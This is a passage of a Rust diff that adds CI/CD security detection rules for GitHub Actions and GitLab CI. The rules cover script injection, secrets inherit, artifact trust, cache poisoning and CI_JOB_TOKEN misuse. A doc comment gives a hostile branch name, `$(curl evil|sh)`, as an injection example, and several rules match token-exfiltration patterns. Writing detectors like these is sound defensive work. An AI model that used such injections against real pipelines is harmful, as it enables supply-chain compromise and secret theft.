+    "workflow_run",
+];
+
+/// Returns true if any trigger name in the comma-joined `META_TRIGGERS` list
+/// matches a risky trigger.
+fn graph_has_risky_trigger(graph: &AuthorityGraph) -> bool {
+    let Some(triggers) = graph.metadata.get(META_TRIGGERS) else {
+        return false;
+    };
+    triggers
+        .split(',')
+        .any(|t| RISKY_TRIGGER_NAMES.contains(&t.trim()))
+}
+
+/// Returns the first risky trigger name present on the graph, for messaging.
+fn first_risky_trigger(graph: &AuthorityGraph) -> Option<String> {
+    let triggers = graph.metadata.get(META_TRIGGERS)?;
+    triggers
+        .split(',')
+        .find(|t| RISKY_TRIGGER_NAMES.contains(&t.trim()))
+        .map(|s| s.trim().to_string())
+}
+
+/// Rule: reusable workflow call uses `secrets: inherit` under a risky trigger.
+///
+/// Fires once per Step node carrying `META_SECRETS_INHERIT = "true"` when the
+/// graph's `META_TRIGGERS` set contains at least one attacker-influenced
+/// trigger (`pull_request`, `pull_request_target`, `issue_comment`,
+/// `workflow_run`, `pull_request_review`, `pull_request_review_comment`).
+///
+/// `secrets: inherit` forwards the entire caller secret bag to the callee
+/// regardless of which secrets the callee actually consumes. Combined with a
+/// trigger an external party can fire, every secret in scope is one
+/// compromised callee away from exfiltration.
+pub fn secrets_inherit_overscoped_passthrough(graph: &AuthorityGraph) -> Vec<Finding> {
+    if !graph_has_risky_trigger(graph) {
+        return Vec::new();
+    }
+    let trigger = first_risky_trigger(graph).unwrap_or_else(|| "risky".into());
+
+    let mut findings = Vec::new();
+    for step in graph.nodes_of_kind(NodeKind::Step) {
+        let inherits = step
+            .metadata
+            .get(META_SECRETS_INHERIT)
+            .map(|v| v == "true")
+            .unwrap_or(false);
+        if !inherits {
+            continue;
+        }
+
+        // Find the reusable workflow target the step delegates to (if any) so
+        // the message can name the callee.
+        let target_name = graph
+            .edges_from(step.id)
+            .filter(|e| e.kind == EdgeKind::DelegatesTo)
+            .filter_map(|e| graph.node(e.to))
+            .find(|n| n.kind == NodeKind::Image)
+            .map(|n| n.name.clone())
+            .unwrap_or_else(|| "<unknown>".into());
+
+        findings.push(Finding {
+            severity: Severity::High,
+            category: FindingCategory::SecretsInheritOverscopedPassthrough,
+            path: None,
+            nodes_involved: vec![step.id],
+            message: format!(
+                "Job '{}' calls reusable workflow '{}' with `secrets: inherit` while the workflow is triggered by '{}' — every caller secret forwards to the callee regardless of need",
+                step.name, target_name, trigger
+            ),
+            recommendation: Recommendation::Manual {
+                action: "Replace `secrets: inherit` with an explicit `secrets:` mapping listing only the secrets the callee actually consumes. For PR/comment/workflow_run-triggered callers, audit the callee for log exposure of every forwarded secret.".into(),
+            },
+            source: FindingSource::BuiltIn,
+            extras: FindingExtras::default(),
+        });
+    }
+
+    findings
+}
+
+/// Rule: `workflow_run`/`pull_request_target` consumer downloads a PR-context
+/// artifact AND interprets its content into a privileged sink.
+///
+/// Requires:
+/// 1. Graph trigger is `workflow_run` or `pull_request_target` (the producer
+///    ran in PR context, so the artifact is attacker-controlled).
+/// 2. At least one Step in a job carries `META_DOWNLOADS_ARTIFACT = "true"`.
+/// 3. At least one Step in the *same job* carries
+///    `META_INTERPRETS_ARTIFACT = "true"` (post-to-comment, write to
+///    `$GITHUB_ENV`, `eval`, `unzip`, `cat`, `jq`, …).
+///
+/// Differs from `artifact_boundary_crossing`: that rule flags upload→download
+/// trust crossings on Artifact nodes; this rule additionally requires the
+/// consumer interprets the downloaded content.
+pub fn unsafe_pr_artifact_in_workflow_run_consumer(graph: &AuthorityGraph) -> Vec<Finding> {
+    // Trigger gate: workflow_run consumers and pull_request_target both run
+    // in upstream-repo context with elevated permissions while the artifact
+    // (or PR head ref) originates from PR context.
+    let triggers_ok = {
+        let single = graph
+            .metadata
+            .get(META_TRIGGER)
+            .map(|s| s == "workflow_run" || s == "pull_request_target")
+            .unwrap_or(false);
+        let multi = graph
+            .metadata
+            .get(META_TRIGGERS)
+            .map(|s| {
+                s.split(',')
+                    .any(|t| t.trim() == "workflow_run" || t.trim() == "pull_request_target")
+            })
+            .unwrap_or(false);
+        single || multi
+    };
+    if !triggers_ok {
+        return Vec::new();
+    }
+
+    // Group steps by job name so we can pair download + interpret within a job.
+    use std::collections::BTreeMap;
+    let mut by_job: BTreeMap<String, (Vec<NodeId>, Vec<NodeId>)> = BTreeMap::new();
+    for step in graph.nodes_of_kind(NodeKind::Step) {
+        let job = step
+            .metadata
+            .get(META_JOB_NAME)
+            .cloned()
+            .unwrap_or_default();
+        let entry = by_job.entry(job).or_default();
+        if step
+            .metadata
+            .get(META_DOWNLOADS_ARTIFACT)
+            .map(|v| v == "true")
+            .unwrap_or(false)
+        {
+            entry.0.push(step.id);
+        }
+        if step
+            .metadata
+            .get(META_INTERPRETS_ARTIFACT)
+            .map(|v| v == "true")
+            .unwrap_or(false)
+        {
+            entry.1.push(step.id);
+        }
+    }
+
+    let mut findings = Vec::new();
+    for (job, (downloaders, interpreters)) in by_job {
+        if downloaders.is_empty() || interpreters.is_empty() {
+            continue;
+        }
+        let mut nodes_involved = downloaders.clone();
+        nodes_involved.extend(interpreters.iter().copied());
+
+        let job_label = if job.is_empty() {
+            "<workflow-level>".to_string()
+        } else {
+            job
+        };
+
+        findings.push(Finding {
+            severity: Severity::High,
+            category: FindingCategory::UnsafePrArtifactInWorkflowRunConsumer,
+            path: None,
+            nodes_involved,
+            message: format!(
+                "Job '{}' downloads a PR-context artifact and interprets its content (post-to-comment, $GITHUB_ENV write, eval/unzip/cat/jq) — malicious PRs can write arbitrary content into the artifact while the consumer runs with upstream-repo authority",
+                job_label
+            ),
+            recommendation: Recommendation::Manual {
+                action: "Treat downloaded artifacts as untrusted: validate against a strict schema before parsing, never feed contents into `eval`/`$GITHUB_ENV`/`$GITHUB_OUTPUT`, and post comment bodies through a length-and-character-allowlist filter. Where possible, separate the privileged-sink step into its own job that does not download the artifact.".into(),
+            },
+            source: FindingSource::BuiltIn,
+            extras: FindingExtras::default(),
+        });
+    }
+
+    findings
+}
+
+// ── GHA security rules from corpus gap analysis ─────────────────────────
+//
+// Source: MEMORY/WORK/20260425-230443_taudit-gitlab-parser/corpus-results/council-gha-gaps.md
+// Rules R1, R5, R9, R10. All four read META_SCRIPT_BODY (R1, R10) or
+// step-level metadata stamped by the GHA parser (R5, R9). They gate on
+// META_TRIGGERS where a specific trigger surface is required.
+
+/// Returns true if `triggers_csv` (the comma-separated value of META_TRIGGERS
+/// stamped by the GHA parser) contains any of `wanted`. Tolerant of
+/// whitespace and empty entries.
+fn triggers_contain_any(triggers_csv: Option<&String>, wanted: &[&str]) -> bool {
+    let Some(csv) = triggers_csv else {
+        return false;
+    };
+    csv.split(',')
+        .map(|s| s.trim())
+        .any(|t| wanted.contains(&t))
+}
+
+/// Substring locations of every `${{ ... }}` expression inside `body`. Returns
+/// the inner trimmed expression text plus the byte range so callers can attach
+/// surrounding-context heuristics. Doesn't try to handle nested `}}` — none of
+/// the patterns we care about contain it.
+fn find_template_expressions(body: &str) -> Vec<(String, std::ops::Range<usize>)> {
+    let mut out = Vec::new();
+    let mut cursor = 0usize;
+    while let Some(rel_open) = body[cursor..].find("${{") {
+        let open = cursor + rel_open;
+        let inner_start = open + 3;
+        let Some(rel_close) = body[inner_start..].find("}}") else {
+            break;
+        };
+        let close = inner_start + rel_close;
+        let expr = body[inner_start..close].trim().to_string();
+        out.push((expr, open..close + 2));
+        cursor = close + 2;
+    }
+    out
+}
+
+/// Patterns that mark an attacker-controllable expression for R1.
+/// Order matters only for documentation — detection is OR.
+fn is_untrusted_context_expression(expr: &str) -> bool {
+    // Strip leading/trailing whitespace already done by caller.
+    // Examples: `github.event.issue.title`, `github.event.pull_request.body`,
+    // `github.event.comment.body`, `github.event.review.body`,
+    // `github.head_ref`, `inputs.target_branch`.
+    if expr.starts_with("github.event.issue.")
+        || expr.starts_with("github.event.pull_request.")
+        || expr.starts_with("github.event.comment.")
+        || expr.starts_with("github.event.review.")
+        || expr.starts_with("github.event.discussion.")
+        || expr.starts_with("github.event.workflow_run.")
+        || expr.starts_with("github.event.inputs.")
+    {
+        return true;
+    }
+    if expr == "github.head_ref" || expr.starts_with("github.head_ref ") {
+        return true;
+    }
+    // `inputs.X` is attacker-influenced under workflow_dispatch / workflow_run
+    // / issue_comment-driven inputs. The rule's caller gates on the trigger
+    // surface, so any `inputs.*` here is suspect.
+    if let Some(rest) = expr.strip_prefix("inputs.") {
+        if !rest.is_empty() {
+            return true;
+        }
+    }
+    false
+}
+
+/// Returns true when an expression's value lands in a script sink that
+/// matters for R1 — shell text, JS source, or a write to GITHUB_ENV /
+/// GITHUB_OUTPUT. Heuristic: the expression is **not** the right-hand side of
+/// a YAML `env:` mapping. The parser already separates step-level `env:`
+/// mappings into the secret/auth machinery, so any expression appearing inside
+/// the script body itself bypasses the env-indirection mitigation by
+/// definition.
+fn is_script_injection_sink(_body: &str, _range: &std::ops::Range<usize>) -> bool {
+    // Every occurrence inside META_SCRIPT_BODY qualifies — the body is the
+    // shell/JS source itself. (Step-level `env:` values are stored on the
+    // edges, not in the body.) Kept as a function so the doc string spells
+    // the rationale and future heuristics have a clear hook.
+    true
+}
+
+/// R1 — script injection via untrusted context.
+///
+/// Severity: Critical. Classic GitHub Actions remote code execution: an
+/// expression that an external actor controls (`github.event.issue.title`,
+/// `github.head_ref`, `github.event.inputs.*` under `workflow_dispatch`)
+/// gets concatenated into the shell command (or JS source for
+/// `actions/github-script`) at YAML-render time, before any quoting or
+/// escaping the runtime would apply to env-bound values.
+pub fn script_injection_via_untrusted_context(graph: &AuthorityGraph) -> Vec<Finding> {
+    let mut findings = Vec::new();
+
+    for step in graph.nodes_of_kind(NodeKind::Step) {
+        let Some(body) = step.metadata.get(META_SCRIPT_BODY) else {
+            continue;
+        };
+        if body.is_empty() {
+            continue;
+        }
+
+        let mut hits: Vec<String> = Vec::new();
+        for (expr, range) in find_template_expressions(body) {
+            if !is_untrusted_context_expression(&expr) {
+                continue;
+            }
+            if !is_script_injection_sink(body, &range) {
+                continue;
+            }
+            if !hits.contains(&expr) {
+                hits.push(expr);
+            }
+        }
+
+        if hits.is_empty() {
+            continue;
+        }
+
+        // Cap preview to keep the message readable even when a step has many
+        // distinct attacker-controlled interpolations.
+        let preview: String = hits
+            .iter()
+            .take(3)
+            .map(|s| format!("${{{{ {s} }}}}"))
+            .collect::<Vec<_>>()
+            .join(", ");
+        let suffix = if hits.len() > 3 {
+            format!(", and {} more", hits.len() - 3)
+        } else {
+            String::new()
+        };
+
+        findings.push(Finding {
+            severity: Severity::Critical,
+            category: FindingCategory::ScriptInjectionViaUntrustedContext,
+            path: None,
+            nodes_involved: vec![step.id],
+            message: format!(
+                "Step '{}' interpolates attacker-controlled expression(s) {preview}{suffix} directly into a script body without an env: indirection — classic GitHub Actions RCE",
+                step.name
+            ),
+            recommendation: Recommendation::Manual {
+                action: "Bind the expression to a step-level `env:` variable and reference it as `\"$VAR\"` (shell) or `process.env.VAR` (JS). The runtime then quotes the value as data instead of YAML-rendering it as code.".into(),
+            },
+            source: FindingSource::BuiltIn,
+            extras: FindingExtras::default(),
+        });
+    }
+
+    findings
+}
+
+/// R5 — interactive debug action in an authority workflow.
+///
+/// Severity: High. A successful tmate / upterm session opens an external SSH
+/// endpoint into the runner with the full job environment loaded — every
+/// secret in scope, the checked-out HEAD, and write access to whatever the
+/// GITHUB_TOKEN holds. Anyone who can flip `debug_enabled=true` at job start
+/// (often a maintainer with `workflow_dispatch` permission) can launder the
+/// job's authority off the runner.
+pub fn interactive_debug_action_in_authority_workflow(graph: &AuthorityGraph) -> Vec<Finding> {
+    let mut findings = Vec::new();
+
+    // Pre-compute whether the workflow holds non-default authority.
+    // Two ways to qualify:
+    //  (a) any step has access to a non-GITHUB_TOKEN Secret or Identity, OR
+    //  (b) any GITHUB_TOKEN identity has a non-default write permission.
+    let workflow_has_extra_secrets = graph.authority_sources().any(|n| match n.kind {
+        NodeKind::Secret => true,
+        NodeKind::Identity => {
+            // GITHUB_TOKEN identities are named `GITHUB_TOKEN` or
+            // `GITHUB_TOKEN (<job>)`. Anything else is extra authority
+            // (cloud OIDC, ADO service connection, …).
+            !n.name.starts_with("GITHUB_TOKEN")
+        }
+        _ => false,
+    });
+
+    let workflow_has_token_writes = graph
+        .nodes_of_kind(NodeKind::Identity)
+        .filter(|n| n.name.starts_with("GITHUB_TOKEN"))
+        .any(|n| {
+            n.metadata
+                .get(META_PERMISSIONS)
+                .map(|p| {
+                    let s = p.to_lowercase();
+                    s.contains("write") || s == "write-all"
+                })
+                .unwrap_or(false)
+        });
+
+    if !(workflow_has_extra_secrets || workflow_has_token_writes) {
+        return findings;
+    }
+
+    for step in graph.nodes_of_kind(NodeKind::Step) {
+        let Some(action_ref) = step.metadata.get(META_INTERACTIVE_DEBUG) else {
+            continue;
+        };
+
+        findings.push(Finding {
+            severity: Severity::High,
+            category: FindingCategory::InteractiveDebugActionInAuthorityWorkflow,
+            path: None,
+            nodes_involved: vec![step.id],
+            message: format!(
+                "Step '{}' uses interactive debug action '{action_ref}' inside a workflow that holds non-default secrets or write permissions — a successful debug session forwards the runner's full environment over SSH",
+                step.name
+            ),
+            recommendation: Recommendation::Manual {
+                action: "Move the debug action into a separate workflow with no secret access and `permissions: read-all`, OR gate the step on an explicit short-lived `workflow_dispatch` input that is removed after use. Never run tmate/upterm in a workflow that holds production credentials.".into(),
+            },
+            source: FindingSource::BuiltIn,
+            extras: FindingExtras::default(),
+        });
+    }
+
+    findings
+}
+
+/// R9 — PR-specific cache key in a default-branch consumer.
+///
+/// Severity: Medium. Speculative rule from the council gap report; the corpus
+/// did not show a perfect example, so we emit Medium and document the risk.
+/// A PR build that writes to a cache keyed on `github.head_ref` /
+/// `github.event.pull_request.head.ref` / `github.actor` populates an entry
+/// that a later default-branch run can restore — letting an attacker poison
+/// the build cache from a fork PR.
+pub fn pr_specific_cache_key_in_default_branch_consumer(graph: &AuthorityGraph) -> Vec<Finding> {
+    let mut findings = Vec::new();
+
+    // Trigger gate: workflow must run on `push` (default branch) AND on a
+    // PR-context trigger. Without the push side, the cache write never gets
+    // restored by a privileged consumer; without the PR side, no untrusted
+    // contributor can populate the cache to begin with.
+    let triggers = graph.metadata.get(META_TRIGGERS);
+    let runs_on_push = triggers_contain_any(triggers, &["push"]);
+    let runs_on_pr = triggers_contain_any(triggers, &["pull_request", "pull_request_target"]);
+    if !(runs_on_push && runs_on_pr) {
+        return findings;
+    }
+
+    for step in graph.nodes_of_kind(NodeKind::Step) {
+        let Some(key) = step.metadata.get(META_CACHE_KEY) else {
+            continue;
+        };
+        if key.is_empty() {
+            continue;
+        }
+        // Detect PR-derived key fragments. Match common spelling variants.
+        let lower = key.to_lowercase();
+        let is_pr_keyed = lower.contains("github.head_ref")
+            || lower.contains("github.event.pull_request.head.ref")
+            || lower.contains("github.event.pull_request.head.sha")
+            || lower.contains("github.actor")
+            || lower.contains("github.triggering_actor");
+        if !is_pr_keyed {
+            continue;
+        }
+
+        findings.push(Finding {
+            severity: Severity::Medium,
+            category: FindingCategory::PrSpecificCacheKeyInDefaultBranchConsumer,
+            path: None,
+            nodes_involved: vec![step.id],
+            message: format!(
+                "Step '{}' caches with a PR-derived key ('{key}') in a workflow that also runs on push — a fork PR can poison the cache that the default-branch build later restores",
+                step.name
+            ),
+            recommendation: Recommendation::Manual {
+                action: "Split the workflow so the `actions/cache` save side runs only on `push: branches: [main]` (or another protected ref) and PR runs use cache restore-only with `lookup-only: true`. Alternatively, key the cache on the file hashes that determine its content, not the branch or actor.".into(),
+            },
+            source: FindingSource::BuiltIn,
+            extras: FindingExtras::default(),
+        });
+    }
+
+    findings
+}
+
+/// R10 — `gh` / `gh api` runtime escalation with the default GITHUB_TOKEN.
+///
+/// Severity: Medium. Static permission checks see only the declared
+/// `permissions:` block — they miss runtime calls that use the token to
+/// perform write-class operations the workflow shouldn't be doing in a
+/// PR-triggered context. Detects `gh ` invocations that mutate state
+/// (`pr merge`, `release create/upload`, `api -X POST/PATCH/PUT/DELETE`)
+/// in workflows triggered by `pull_request`, `issue_comment`, or
+/// `workflow_run`.
+pub fn gh_cli_with_default_token_escalating(graph: &AuthorityGraph) -> Vec<Finding> {
+    let mut findings = Vec::new();
+
+    // Trigger gate.
+    let triggers = graph.metadata.get(META_TRIGGERS);
+    let risky_trigger = triggers_contain_any(
+        triggers,
+        &[
+            "pull_request",
+            "pull_request_target",
+            "issue_comment",
+            "workflow_run",
+            "pull_request_review",
+            "pull_request_review_comment",
+        ],
+    );
+    if !risky_trigger {
+        return findings;
+    }
+
+    for step in graph.nodes_of_kind(NodeKind::Step) {
+        let Some(body) = step.metadata.get(META_SCRIPT_BODY) else {
+            continue;
+        };
+        if body.is_empty() {
+            continue;
+        }
+        if !body_contains_gh_cli(body) {
+            continue;
+        }
+        let Some(verb) = detect_gh_escalating_verb(body) else {
+            continue;
+        };
+
+        findings.push(Finding {
+            severity: Severity::Medium,
+            category: FindingCategory::GhCliWithDefaultTokenEscalating,
+            path: None,
+            nodes_involved: vec![step.id],
+            message: format!(
+                "Step '{}' invokes `gh {verb}` against the default GITHUB_TOKEN inside a workflow triggered by an untrusted context — runtime privilege escalation that static permission checks miss",
+                step.name
+            ),
+            recommendation: Recommendation::Manual {
+                action: "Move write-class `gh`/`gh api` calls into a separate workflow gated on `push` (or an explicit reusable workflow with `secrets: inherit` only for the writer side). On the PR-triggered side, enforce `permissions: read-all` and verify by re-reading the GitHub Actions audit log.".into(),
+            },
+            source: FindingSource::BuiltIn,
+            extras: FindingExtras::default(),
+        });
+    }
+
+    findings
+}
+
+/// True when `body` invokes the `gh` CLI as a command (not just mentions
+/// the substring `gh` inside another word). Match `gh ` at start of line, after
+/// `;`, after `&&`, after `|`, or following indentation/whitespace.
+fn body_contains_gh_cli(body: &str) -> bool {
+    for line in body.lines() {
+        let trimmed = line.trim_start();
+        if trimmed.starts_with("gh ") || trimmed.starts_with("gh\t") {
+            return true;
+        }
+        // Inline forms after a shell separator.
+        for sep in ["&& gh ", "|| gh ", "; gh ", "$(gh ", "`gh ", "| gh "] {
+            if trimmed.contains(sep) {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+/// If `body` invokes a write-class `gh` verb, return a short label for it.
+/// Recognised:
+///   - `gh pr merge`
+///   - `gh release create` / `gh release upload` / `gh release delete`
+///   - `gh api -X POST|PATCH|PUT|DELETE` (any path)
+///   - `gh api ... <method>` against `/repos/.../{contents,releases,actions/secrets,environments}`
+fn detect_gh_escalating_verb(body: &str) -> Option<String> {
+    let lower = body.to_lowercase();
+    if lower.contains("gh pr merge") {
+        return Some("pr merge".into());
+    }
+    if lower.contains("gh release create") {
+        return Some("release create".into());
+    }
+    if lower.contains("gh release upload") {
+        return Some("release upload".into());
+    }
+    if lower.contains("gh release delete") {
+        return Some("release delete".into());
+    }
+    if lower.contains("gh release edit") {
+        return Some("release edit".into());
+    }
+    // `gh api -X <METHOD>` form. Match the method tokens directly so we don't
+    // false-positive on `-X-Foo` headers etc.
+    for method in ["post", "patch", "put", "delete"] {
+        let needle_dash = format!("gh api -x {method}");
+        let needle_long = format!("gh api --method {method}");
+        if lower.contains(&needle_dash) || lower.contains(&needle_long) {
+            return Some(format!("api -X {}", method.to_uppercase()));
+        }
+    }
+    // Path-based heuristic: even without an explicit -X, certain endpoints are
+    // mutation endpoints (`gh api repos/.../actions/secrets/FOO -F ...`).
+    let path_markers = [
+        "actions/secrets",
+        "actions/variables",
+        "/environments",
+        "/releases",
+    ];
+    if lower.contains("gh api ") && path_markers.iter().any(|m| lower.contains(m)) {
+        // Only escalate when there's also a write-flag. `-f`/`-F`/`--field`/`--input`
+        // implies POST/PATCH semantics under `gh api`.
+        let writes = lower.contains(" -f ")
+            || lower.contains(" -f=")
+            || lower.contains(" -f\"")
+            || lower.contains(" --field")
+            || lower.contains(" --input");
+        if writes {
+            return Some("api (mutation endpoint)".into());
+        }
+    }
+    None
+}
+
+// ── GitLab CI rules ─────────────────────────────────────────
+
+/// Untrusted GitLab CI predefined variables that an attacker can control by
+/// pushing a branch / opening an MR / writing a commit message. When any of
+/// these is interpolated into an unquoted shell expansion the runner
+/// executes whatever the attacker put inside `` $(...) `` or backticks.
+const UNTRUSTED_GITLAB_CI_VARS: &[&str] = &[
+    "CI_COMMIT_BRANCH",
+    "CI_COMMIT_REF_NAME",
+    "CI_COMMIT_TAG",
+    "CI_COMMIT_MESSAGE",
+    "CI_COMMIT_TITLE",
+    "CI_COMMIT_DESCRIPTION",
+    "CI_COMMIT_AUTHOR",
+    "CI_MERGE_REQUEST_TITLE",
+    "CI_MERGE_REQUEST_DESCRIPTION",
+    "CI_MERGE_REQUEST_SOURCE_BRANCH_NAME",
+];
+
+/// Rule: `$CI_JOB_TOKEN` (the GitLab platform-injected job token, broad scope
+/// by default — registry write, package upload, project read) used as a
+/// bearer credential against an external HTTP endpoint, or fed to
+/// `docker login` for `registry.gitlab.com`.
+///
+/// Detection: read the Step's `META_SCRIPT_BODY`. Fire when the body
+/// contains `$CI_JOB_TOKEN` or `${CI_JOB_TOKEN}` AND any of:
+/// - a `curl` / `wget` / `http` / `https.request` invocation, OR
+/// - the literal `gitlab-ci-token:` (the token-as-Basic-auth idiom), OR
+/// - a `docker login` for `registry.gitlab.com`.
+///
+/// Severity: High. Category: Credentials.
+pub fn ci_job_token_to_external_api(graph: &AuthorityGraph) -> Vec<Finding> {
+    let mut findings = Vec::new();
+
+    for step in graph.nodes_of_kind(NodeKind::Step) {
+        let body = match step.metadata.get(META_SCRIPT_BODY) {
+            Some(b) if !b.is_empty() => b,
+            _ => continue,
+        };
+
+        if !body_references_ci_job_token(body) {
+            continue;
+        }
+
+        let sink = classify_ci_job_token_sink(body);
+        let Some(sink) = sink else {
+            continue;
+        };
+
+        findings.push(Finding {
+            severity: Severity::High,
+            category: FindingCategory::CiJobTokenToExternalApi,
+            path: None,
+            nodes_involved: vec![step.id],
+            message: format!(
+                "Step '{}' uses $CI_JOB_TOKEN as a bearer credential ({}) — the token's default scope (registry write, package upload, project read) means a poisoned MR job that emits it can pivot to package or registry pushes",
+                step.name, sink
+            ),
+            recommendation: Recommendation::Manual {
+                action: "Scope CI_JOB_TOKEN: in Settings → CI/CD → Job token permissions, set the inbound allowlist to the minimum projects required and disable any unused scope (package_registry, container_registry). For uploads, prefer a dedicated short-lived deploy token over CI_JOB_TOKEN. Never POST CI_JOB_TOKEN to webhooks or third-party APIs.".into(),
+            },
+            source: FindingSource::BuiltIn,
+            extras: FindingExtras::default(),
+        });
+    }
+
+    findings
+}
+
+fn body_references_ci_job_token(body: &str) -> bool {
+    body.contains("$CI_JOB_TOKEN") || body.contains("${CI_JOB_TOKEN}")
+}
+
+/// Classify how `$CI_JOB_TOKEN` is being used. Returns a short human-readable
+/// sink description, or None when the token only appears in benign ways
+/// (e.g. assignment to an env var that's never read).
+fn classify_ci_job_token_sink(body: &str) -> Option<&'static str> {
+    let lower = body.to_lowercase();
+    // gitlab-ci-token:$CI_JOB_TOKEN — the canonical Basic-auth idiom.
+    if lower.contains("gitlab-ci-token:") && body_references_ci_job_token(body) {
+        if lower.contains("docker login") && lower.contains("registry.gitlab.com") {
+            return Some("docker login registry.gitlab.com");
+        }
+        if lower.contains("curl") || lower.contains("wget") {
+            return Some("curl/wget Basic auth (user gitlab-ci-token)");
+        }
+        return Some("Basic-auth credential (user gitlab-ci-token)");
+    }
+    // JOB-TOKEN: header form (curl/wget against /api/v4/...).
+    if lower.contains("job-token:") && body_references_ci_job_token(body) {
+        return Some("JOB-TOKEN header to GitLab API");
+    }
+    // curl --header "PRIVATE-TOKEN: $CI_JOB_TOKEN" or similar bearer use.
+    if (lower.contains("curl") || lower.contains("wget"))
+        && (lower.contains("authorization:") || lower.contains("private-token:"))
+        && body_references_ci_job_token(body)
+    {
+        return Some("Authorization/PRIVATE-TOKEN header to HTTP endpoint");
+    }
+    // Generic: token appears next to a CI_API_V4_URL request — strong signal.
+    if body.contains("CI_API_V4_URL") && body_references_ci_job_token(body) {
+        return Some("HTTP request to ${CI_API_V4_URL} with token");
+    }
+    None
+}
+
+/// Rule: GitLab `id_tokens:` audience reused across MR-context and
+/// protected-context jobs in the same file (no audience separation), or set
+/// to a wildcard / multi-cloud broker URL, or shared with a `secrets:` Vault
+/// path that the consuming job doesn't need.
+///
+/// Detection: collect every OIDC Identity node (Identity with
+/// `META_OIDC == "true"`) carrying a `META_OIDC_AUDIENCE`. For each audience:
+/// - Wildcard / `*` audience → fire (b).
+/// - Same audience reachable from at least one Step marked `META_TRIGGER ==
+///   merge_request` AND at least one Step that is NOT (i.e. protected-context
+///   only) → fire (a).
+///
+/// Severity: High. Category: Privilege.
+pub fn id_token_audience_overscoped(graph: &AuthorityGraph) -> Vec<Finding> {
+    use std::collections::HashMap as Map;
+
+    let mut findings = Vec::new();
+
+    // Collect (audience → (identity_id, [step_ids that reach it])).
+    let mut by_aud: Map<&str, Vec<(NodeId, Vec<NodeId>)>> = Map::new();
+
+    for ident in graph.nodes_of_kind(NodeKind::Identity) {
+        let is_oidc = ident.metadata.get(META_OIDC).map(String::as_str) == Some("true");
+        if !is_oidc {
+            continue;
+        }
+        let Some(aud) = ident.metadata.get(META_OIDC_AUDIENCE) else {
+            continue;
+        };
+        if aud == "unknown" || aud.is_empty() {
+            continue;
+        }
+
+        // Find steps that hold this identity via HasAccessTo.
+        let mut consumers: Vec<NodeId> = Vec::new();
+        for step in graph.nodes_of_kind(NodeKind::Step) {
+            let holds = graph
+                .edges_from(step.id)
+                .any(|e| e.kind == EdgeKind::HasAccessTo && e.to == ident.id);
+            if holds {
+                consumers.push(step.id);
+            }
+        }
+        by_aud
+            .entry(aud.as_str())
+            .or_default()
+            .push((ident.id, consumers));
+    }
+
+    for (aud, entries) in &by_aud {
+        // (b) Wildcard / suspiciously broad audience.
+        let is_wildcard = *aud == "*"
+            || aud.contains("/*")
+            || aud.eq_ignore_ascii_case("any")
+            || aud.eq_ignore_ascii_case("default");
+        if is_wildcard {
+            // Use the first identity node as the anchor.
+            if let Some((ident_id, consumers)) = entries.first() {
+                let mut nodes_involved = vec![*ident_id];
+                nodes_involved.extend(consumers.iter().copied());
+                findings.push(Finding {
+                    severity: Severity::High,
+                    category: FindingCategory::IdTokenAudienceOverscoped,
+                    path: None,
+                    nodes_involved,
+                    message: format!(
+                        "OIDC id_token audience '{aud}' is wildcard / catch-all — any cloud / Vault role bound to this audience is reachable from every job that mints the token"
+                    ),
+                    recommendation: Recommendation::Manual {
+                        action: "Replace the wildcard `aud:` with a job- or environment-specific audience (e.g. `vault.gitlab.net/prod-deploy`, `aws-deploy-staging`). Bind the downstream role / Vault path to that exact audience so unrelated jobs can't trade the token for the same credential.".into(),
+                    },
+                    source: FindingSource::BuiltIn,
+                    extras: FindingExtras::default(),
+                });
+                continue;
+            }
+        }
+
+        // (a) Same audience reachable from MR-context AND non-MR-context steps.
+        let all_consumers: Vec<NodeId> = entries
+            .iter()
+            .flat_map(|(_, c)| c.iter().copied())
+            .collect();
+        let mut has_mr = false;
+        let mut has_protected = false;
+        for sid in &all_consumers {
+            let Some(step) = graph.node(*sid) else {
+                continue;
+            };
+            if step.metadata.get(META_TRIGGER).map(String::as_str) == Some("merge_request") {
+                has_mr = true;
+            } else {
+                has_protected = true;
+            }
+        }
+        if has_mr && has_protected && !entries.is_empty() {
+            // Anchor at the first identity node carrying this audience.
+            let (ident_id, _) = &entries[0];
+            let mut nodes_involved = vec![*ident_id];
+            nodes_involved.extend(all_consumers.iter().copied());
+            findings.push(Finding {
+                severity: Severity::High,
+                category: FindingCategory::IdTokenAudienceOverscoped,
+                path: None,
+                nodes_involved,
+                message: format!(
+                    "OIDC id_token audience '{aud}' is shared across merge_request_event jobs and protected-branch jobs — a poisoned MR can mint a token with the same audience as the production deploy and trade it for the same downstream cloud / Vault role"
+                ),
+                recommendation: Recommendation::Manual {
+                    action: "Split audiences by trust context: declare a separate `aud:` for MR-context jobs (e.g. `…/mr-validate`) and a different `aud:` for protected-branch jobs (e.g. `…/prod-deploy`). Bind each downstream role / Vault path to the exact audience of the job that needs it.".into(),
+                },
+                source: FindingSource::BuiltIn,
+                extras: FindingExtras::default(),
+            });
+        }
+    }
+
+    findings
+}
+
+/// Rule: untrusted GitLab predefined variable interpolated unquoted into a
+/// shell context (`script:` / `before_script:` / `after_script:` /
+/// `environment:url:`). A branch named `` $(curl evil|sh) `` then runs as
+/// part of the runner.
+///
+/// Detection: for each Step, scan `META_SCRIPT_BODY` and `META_ENVIRONMENT_URL`
+/// for any of `UNTRUSTED_GITLAB_CI_VARS` referenced via `$VAR`, `${VAR}`, or
+/// `"$VAR"`/`"${VAR}"` (double-quoted — still expanded). A reference inside
+/// single quotes does NOT fire. Same for `printf %q` / `${VAR@Q}` /
+/// `${VAR//[^A-Za-z0-9]/}` sanitised forms.
+///
+/// Severity: High. Category: Injection.
+pub fn untrusted_ci_var_in_shell_interpolation(graph: &AuthorityGraph) -> Vec<Finding> {
+    let mut findings = Vec::new();
+
+    for step in graph.nodes_of_kind(NodeKind::Step) {
+        let mut hits: Vec<&str> = Vec::new();
+        let mut where_hit: Vec<&str> = Vec::new();
+
+        if let Some(body) = step.metadata.get(META_SCRIPT_BODY) {
+            for var in UNTRUSTED_GITLAB_CI_VARS {
+                if shell_body_unsafely_expands(body, var) {
+                    hits.push(*var);
+                    where_hit.push("script");
+                }
+            }
+        }
+        if let Some(url) = step.metadata.get(META_ENVIRONMENT_URL) {
+            for var in UNTRUSTED_GITLAB_CI_VARS {
+                if url_interpolates_var(url, var) {
+                    if !hits.contains(var) {
+                        hits.push(*var);
+                    }
+                    if !where_hit.contains(&"environment.url") {
+                        where_hit.push("environment.url");
+                    }
